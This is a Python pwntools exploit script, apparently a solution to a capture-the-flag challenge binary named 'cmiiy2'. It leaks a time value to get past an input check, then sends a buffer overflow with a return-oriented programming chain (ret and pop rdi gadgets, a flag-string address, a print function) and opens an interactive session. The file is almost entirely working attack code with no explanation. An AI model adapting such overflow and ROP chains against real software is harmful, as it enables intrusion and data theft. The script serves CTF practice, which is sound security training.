#!/usr/bin/env python3

from pwn import *
import re
import reverse

exe = ELF("./cmiiy2")
ptrace = ELF("./ptrace.so")

context.binary = exe


def conn():
    if args.LOCAL:
        # r = process([exe.path], env={"LD_PRELOAD": ptrace.path})
        r = process([exe.path])

        if args.DBG:
            gdb.attach(r)
    else:
        r = remote("https://pwnthem0le.polito.it/", 1733)

    return r

def catchRe(s):
    match = re.search(r'\b([01]?\d|2[0-3]):[0-5]\d\b', s)
    if match:
        return reverse.main(match.group(0))
    return None

def main():
    r = conn()
    gdb.attach(r)
    timeLeak = catchRe(r.recvuntil(b'[-90..90] : ').decode())
    print(timeLeak)

    # Sending Latitude
    bofSize = 200
    latBypass = f"{timeLeak[0]} {bofSize}"
    r.sendline(latBypass.encode())

    # Sending Latitude
    r.recvuntil(b'[-180..180]: ')
    r.sendline(str(timeLeak[1]).encode())

    
    print(r.recvuntil(b"court):"))
    writeAndPrint = 0x4015a1
    flagtxt = 0x403008
    poprdi = 0x000000000040159c
    r.sendline(cyclic(88) + p64(0x000000000040101a) + p64(poprdi)+ p64(flagtxt) + p64(writeAndPrint))

    print(r.recvuntil(b"impostors:"))
    r.sendline(cyclic(2) + p64(0x401f26))
    
    r.interactive()

if __name__ == "__main__":
    main()